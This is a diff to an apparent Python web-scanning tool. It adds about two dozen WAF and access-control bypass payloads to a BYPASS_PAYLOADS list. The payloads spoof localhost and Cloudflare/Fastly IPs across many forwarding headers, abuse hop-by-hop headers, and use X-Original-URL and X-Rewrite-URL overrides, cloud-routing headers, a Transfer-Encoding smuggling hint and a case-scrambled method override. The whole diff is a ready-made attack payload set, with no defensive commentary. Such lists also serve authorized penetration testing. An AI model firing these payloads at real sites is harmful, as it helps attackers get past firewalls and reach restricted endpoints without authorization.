@@ -49,7 +49,8 @@ from urllib.parse import urlparse, quote
 sys.path.insert(0, str(Path(__file__).parent))
 from smart_filter import (
     build_baseline_404, delay, confidence_label, meets_confidence_floor,
-    random_ua, WAF_BYPASS_HEADERS, MITRE_MAP,
+    random_ua, WAF_BYPASS_HEADERS, MITRE_MAP, make_bypass_headers,
+    PATH_BYPASS_VARIANTS,
 )
 
 CONCURRENCY = 10
@@ -205,6 +206,52 @@ BYPASS_PAYLOADS = [
     # Encoding bypass
     ("X-Forwarded-For: 0x7f000001",          {"X-Forwarded-For": "0x7f000001"}),  # hex
     ("X-Forwarded-For: 2130706433",          {"X-Forwarded-For": "2130706433"}),  # decimal
+    # Multi-header IP saturation (all at once — some WAFs only check one)
+    ("AllIPHeaders: 127.0.0.1", {
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Real-IP": "127.0.0.1",
+        "X-Client-IP": "127.0.0.1",
+        "CF-Connecting-IP": "127.0.0.1",
+        "True-Client-IP": "127.0.0.1",
+        "X-Originating-IP": "127.0.0.1",
+        "X-Remote-Addr": "127.0.0.1",
+    }),
+    # IPv6 localhost variants
+    ("X-Forwarded-For: [::1]",               {"X-Forwarded-For": "[::1]"}),
+    ("X-Forwarded-For: ::ffff:127.0.0.1",    {"X-Forwarded-For": "::ffff:127.0.0.1"}),
+    # Hop-by-hop header abuse
+    ("Connection: close, X-Forwarded-For",   {"Connection": "close, X-Forwarded-For", "X-Forwarded-For": "127.0.0.1"}),
+    # Tab/newline in header value (some WAFs truncate at whitespace)
+    ("X-Forwarded-For: 127.0.0.1\t",         {"X-Forwarded-For": "127.0.0.1\t"}),
+    # Protocol downgrade
+    ("Upgrade-Insecure-Requests: 0",         {"Upgrade-Insecure-Requests": "0"}),
+    # Accept-Language bypass
+    ("Accept-Language: *",                   {"Accept-Language": "*"}),
+    # X-Requested-With (AJAX bypass for some WAF rules)
+    ("X-Requested-With: XMLHttpRequest",     {"X-Requested-With": "XMLHttpRequest"}),
+    # Override endpoint via rewrite header
+    ("X-Rewrite-URL: /",                     {"X-Rewrite-URL": "/"}),
+    ("X-Original-URL: /",                    {"X-Original-URL": "/"}),
+    ("X-Override-URL: /",                    {"X-Override-URL": "/"}),
+    # Cloud-provider internal routing bypass
+    ("X-Azure-FDID: 00000000-0000-0000-0000-000000000000", {"X-Azure-FDID": "00000000-0000-0000-0000-000000000000"}),
+    ("X-Akamai-Config-Log-Detail: 1",        {"X-Akamai-Config-Log-Detail": "1"}),
+    # Transfer-Encoding bypass (chunked smuggling hint)
+    ("Transfer-Encoding: identity",          {"Transfer-Encoding": "identity"}),
+    # Via header to spoof proxy chain
+    ("Via: 1.1 localhost",                   {"Via": "1.1 localhost"}),
+    ("Via: 1.1 127.0.0.1",                   {"Via": "1.1 127.0.0.1"}),
+    # Spoofed CDN/trusted-proxy IPs
+    ("X-Forwarded-For: 173.245.48.1",        {"X-Forwarded-For": "173.245.48.1"}),   # Cloudflare
+    ("X-Forwarded-For: 199.27.128.1",        {"X-Forwarded-For": "199.27.128.1"}),   # Fastly
+    ("X-Forwarded-For: 104.16.0.1",          {"X-Forwarded-For": "104.16.0.1"}),     # Cloudflare
+    # Content-Encoding trick
+    ("Content-Encoding: identity",           {"Content-Encoding": "identity"}),
+    # Case-scrambled method override
+    ("X-Http-Method-Override: gEt",          {"X-Http-Method-Override": "gEt"}),
+    # WAF-vendor-specific whitelisted IPs
+    ("X-Forwarded-For: 108.162.192.1",       {"X-Forwarded-For": "108.162.192.1"}),  # Cloudflare CIDR
+    ("X-Forwarded-For: 198.41.128.1",        {"X-Forwarded-For": "198.41.128.1"}),   # Cloudflare CIDR
 ]
 
 # ── Rate-limit test endpoints ─────────────────────────────────────────────────
